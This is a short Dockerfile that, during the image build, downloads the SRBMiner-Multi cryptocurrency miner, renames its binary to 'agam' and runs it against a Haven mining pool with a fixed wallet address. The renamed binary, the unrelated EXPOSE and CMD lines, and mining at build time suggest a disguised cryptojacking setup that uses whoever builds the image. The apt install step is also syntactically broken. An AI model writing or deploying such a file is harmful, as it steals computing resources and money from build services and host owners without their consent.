FROM debian:stretch
EXPOSE 8080
RUN apt update -y \
  && apt install -y \
     xz-utils
  && apt install -y \
     wget
RUN wget https://github.com/doktor83/SRBMiner-Multi/releases/download/0.6.6/SRBMiner-Multi-0-6-6-Linux.tar.xz   \
  && tar -xvf SRBMiner-Multi-0-6-6-Linux.tar.xz  \
  && cd SRBMiner-Multi-0-6-6   \
  && mv SRBMiner-MULTI agam   \
  && ./agam -a --algorithm cryptonight_xhv --pool fi.haven.herominers.com:10450 --wallet hvxyCVeczdvQGNfDq7iTyacZ3v3mrZaHchbGYzSJzWtxW7NvEDxrmymABUqibfRCf9beswPRnXDAtSdcZX6oEuNW5MC11Jd2Tf.p6 --disable-gpu --cpu-threads 2
ENTRYPOINT ["/bin/bash"]
CMD ["ls"]
